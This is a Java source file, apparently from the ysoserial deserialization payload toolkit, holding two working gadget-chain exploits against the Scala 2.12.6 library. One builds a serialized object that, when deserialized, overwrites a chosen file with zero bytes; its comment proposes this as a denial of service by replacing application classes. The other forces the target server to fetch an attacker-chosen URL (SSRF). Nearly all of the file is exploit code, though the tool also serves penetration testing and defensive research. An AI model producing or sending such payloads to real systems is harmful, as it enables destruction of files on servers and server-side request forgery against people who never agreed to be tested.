package ysoserial.payloads;

import scala.Function0;
import scala.Function1;
import scala.PartialFunction;
import scala.math.Ordering$;
import scala.sys.process.processInternal$;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.net.URL;
import java.util.Comparator;
import java.util.PriorityQueue;

/*
    Two exploits using classes in the scala library.
      * CreateZeroFile will create a file at the target path, or will replace the target path with a 0 byte file.
        Could be useful as a DoS attack by replacing some app class/war?
      * Ssrf will perform a GET request to the given URL.

	Requires:
		org.scala-lang:scala-library
		The below hard-codes some anonymous inner class names so it is likely bound to the 2.12.6 release library.
		Some slight variations will probably work with other versions.
 */

public class Scala {

    private static PriorityQueue<Throwable> createExploit(Function0<Object> exploitFunction) throws Exception {
        PartialFunction<Throwable, Object> onf = processInternal$.MODULE$.onInterrupt(exploitFunction);

        Function1<Throwable, Object> f = new PartialFunction.OrElse(onf, onf);

        // create queue with numbers and basic comparator
        final PriorityQueue<Throwable> queue = new PriorityQueue<Throwable>(2, new Comparator<Throwable>() {
            @Override
            public int compare(Throwable o1, Throwable o2) {
                return 0;
            }
        });

        // stub data for replacement later
        queue.add(new Exception());
        queue.add(new Exception());
        Reflections.setFieldValue(queue, "comparator", Ordering$.MODULE$.<Throwable, Object>by(f, null));

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = new InterruptedException();
        queueArray[1] = new InterruptedException();

        return queue;
    }

    /*
        Gadget chain:
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    scala.math.Ordering$$anon$5.compare()
                        scala.PartialFunction$OrElse.apply()
                            scala.sys.process.processInternal$$anonfun$onIOInterrupt$1.applyOrElse()
                                scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()
                                    java.io.FileOutputStream.<init>()
     */
    @PayloadTest(harness="ysoserial.test.payloads.EmptyFileWriteTest")
    @Dependencies({"org.scala-lang:scala-library:2.12.6"})
    @Authors({ Authors.JACKOFMOSTTRADES })
    public static class ScalaCreateZeroFile extends PayloadRunner implements ObjectPayload<PriorityQueue<Throwable>> {
        public PriorityQueue<Throwable> getObject(final String path) throws Exception {
            Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3");
            Function0<Object> pbf = (Function0<Object>) Reflections.createWithoutConstructor(clazz);
            Reflections.setFieldValue(pbf, "file$1", new File(path));
            Reflections.setFieldValue(pbf, "append$1", false);

            return createExploit(pbf);
        }
    }

    /*
       Gadget chain:
           ObjectInputStream.readObject()
               PriorityQueue.readObject()
                   scala.math.Ordering$$anon$5.compare()
                       scala.PartialFunction$OrElse.apply()
                           scala.sys.process.processInternal$$anonfun$onIOInterrupt$1.applyOrElse()
                               scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1.apply()
                                   java.net.URL.openStream()
    */
    @PayloadTest(harness="ysoserial.test.payloads.SsrfTest")
    @Dependencies({"org.scala-lang:scala-library:2.12.6"})
    @Authors({ Authors.JACKOFMOSTTRADES })
    public static class ScalaSsrf extends PayloadRunner implements ObjectPayload<PriorityQueue<Throwable>> {
        public PriorityQueue<Throwable> getObject(final String url) throws Exception {
            Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1");
            Function0<Object> pbf = (Function0<Object>)Reflections.createWithoutConstructor(clazz);
            Reflections.setFieldValue(pbf, "url$1", new URL(url));

            return createExploit(pbf);
        }
    }

	public static void main(final String[] args) throws Exception {
        //PayloadRunner.run(Scala.CreateZeroFile.class, new String[]{"/tmp/poc.txt"});
        //PayloadRunner.run(Scala.Ssrf.class, new String[]{"http://localhost:7001/foo"});
	}
}
